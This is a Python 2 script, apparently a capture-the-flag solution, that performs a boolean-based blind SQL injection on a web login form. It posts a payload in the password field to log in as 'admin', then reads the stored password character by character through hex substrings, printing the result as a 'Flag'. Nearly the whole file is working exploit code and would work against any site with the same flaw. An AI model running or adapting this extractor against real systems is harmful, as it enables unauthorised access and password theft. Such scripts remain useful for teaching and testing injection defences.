import time
from httplib import *
from urllib import *

HEADERS = {
    "Content-Type" : "application/x-www-form-urlencoded",
    "Accept" : "text/plain",
    'Cookie' : "PHPSESSID=41eabpuebd00gatge1bi646m30",
    "Connection:" : "Keep-alive"
}
CONN = HTTPConnection("theserver.com")
URL = "//a/b/?"
NEEDLE = "Hello User"

def test(r):
    time.sleep(0.1)
    parameters = urlencode({"username" : "admin", "password" : "' or 1=1 and username='admin' and " + r + ";--"})
    CONN.request("POST", URL, parameters, HEADERS)
    response = CONN.getresponse()
    if response.status == 200:
        return response.read().find(NEEDLE) > 0
    else:
        return False

def length(s):
    l = 0  
    while test("length("+s+")>" + str(l)):
        l += 1 
    return l
        
def read(s):
    l = length(s)
    print "    len("+s+") = " + str(l)
    print "   ",
    h = []
    for n in range(0, l*2):
        for i in "6734501289ABCDEF":
            if test("substr(hex("+s+"),"+str(n+1)+",1)='"+i+"'"):
                h.append(i)
                if len(h)%2 == 0:
                    print ".",
                break
    print
    return "".join(h).decode('hex')

      
print "[+] Reading password ..."
print "    Flag : " + read("password")
